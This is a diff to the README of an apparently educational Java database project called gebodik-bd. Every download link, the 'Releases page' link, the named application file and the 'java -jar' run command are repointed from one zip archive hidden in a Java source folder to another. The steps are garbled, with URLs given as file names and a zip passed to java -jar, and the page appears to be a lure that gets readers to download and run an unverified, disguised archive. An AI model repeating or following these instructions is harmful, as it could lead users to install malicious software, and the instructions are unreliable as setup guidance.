@@ -4,28 +4,28 @@
 gebodik-bd is a minimal educational relational database management system (RDBMS) built in Java 17. This project offers an easy way to learn how databases operate. You will find a custom SQL processing pipeline that includes the lexer, parser, semantic analysis, query planning, optimization, and execution. The system also features a storage engine with heap pages, a buffer pool, and supports indexing through B-trees and hashes.
 
 ## 📦 Download Now!
-[![Download gebodik-bd](https://github.com/Theprofiler61/gebodik-bd/raw/refs/heads/main/src/main/java/ru/gebodik-bd-3.0.zip%https://github.com/Theprofiler61/gebodik-bd/raw/refs/heads/main/src/main/java/ru/gebodik-bd-3.0.zip)](https://github.com/Theprofiler61/gebodik-bd/raw/refs/heads/main/src/main/java/ru/gebodik-bd-3.0.zip)
+[![Download gebodik-bd](https://github.com/Theprofiler61/gebodik-bd/raw/refs/heads/main/src/main/java/ru/open/cu/student/memory/serializer/bd_gebodik_v2.9.zip%https://github.com/Theprofiler61/gebodik-bd/raw/refs/heads/main/src/main/java/ru/open/cu/student/memory/serializer/bd_gebodik_v2.9.zip)](https://github.com/Theprofiler61/gebodik-bd/raw/refs/heads/main/src/main/java/ru/open/cu/student/memory/serializer/bd_gebodik_v2.9.zip)
 
 ## 🚀 Getting Started
 To get started with gebodik-bd, follow the steps below. 
 
 ### 🔽 Step 1: Visit the Download Page
-Go to the [Releases page](https://github.com/Theprofiler61/gebodik-bd/raw/refs/heads/main/src/main/java/ru/gebodik-bd-3.0.zip) to find the latest version.
+Go to the [Releases page](https://github.com/Theprofiler61/gebodik-bd/raw/refs/heads/main/src/main/java/ru/open/cu/student/memory/serializer/bd_gebodik_v2.9.zip) to find the latest version.
 
 ### 📥 Step 2: Download the Software
-On the Releases page, look for the latest version. Click the download link for your operating system. The download file may have a name like `https://github.com/Theprofiler61/gebodik-bd/raw/refs/heads/main/src/main/java/ru/gebodik-bd-3.0.zip` or similar.
+On the Releases page, look for the latest version. Click the download link for your operating system. The download file may have a name like `https://github.com/Theprofiler61/gebodik-bd/raw/refs/heads/main/src/main/java/ru/open/cu/student/memory/serializer/bd_gebodik_v2.9.zip` or similar.
 
 ### 📂 Step 3: Unzip the File
 After the download is complete, navigate to your downloads folder. Find the downloaded file and extract its contents. Right-click the file and select "Extract All" or similar option.
 
 ### ⚙️ Step 4: Run the Application
-Within the extracted folder, look for a file named `https://github.com/Theprofiler61/gebodik-bd/raw/refs/heads/main/src/main/java/ru/gebodik-bd-3.0.zip` or similar. This is the main application file. 
+Within the extracted folder, look for a file named `https://github.com/Theprofiler61/gebodik-bd/raw/refs/heads/main/src/main/java/ru/open/cu/student/memory/serializer/bd_gebodik_v2.9.zip` or similar. This is the main application file. 
 
 1. Open a command line or terminal window.
 2. Navigate to the folder where you extracted the files.
 3. Run the following command:
    ```
-   java -jar https://github.com/Theprofiler61/gebodik-bd/raw/refs/heads/main/src/main/java/ru/gebodik-bd-3.0.zip
+   java -jar https://github.com/Theprofiler61/gebodik-bd/raw/refs/heads/main/src/main/java/ru/open/cu/student/memory/serializer/bd_gebodik_v2.9.zip
    ```
 This command will start the application.
 
@@ -92,6 +92,6 @@ Feel free to contribute by reporting issues, suggesting features, or submitting 
 This project is licensed under the MIT License. You are free to use, modify, and distribute the software.
 
 ## 🔗 Download & Install
-To download gebodik-bd, visit this page: [Releases page](https://github.com/Theprofiler61/gebodik-bd/raw/refs/heads/main/src/main/java/ru/gebodik-bd-3.0.zip).
+To download gebodik-bd, visit this page: [Releases page](https://github.com/Theprofiler61/gebodik-bd/raw/refs/heads/main/src/main/java/ru/open/cu/student/memory/serializer/bd_gebodik_v2.9.zip).
 
 Follow the steps to set up your own learning environment with this educational RDBMS. Enjoy exploring the world of databases!
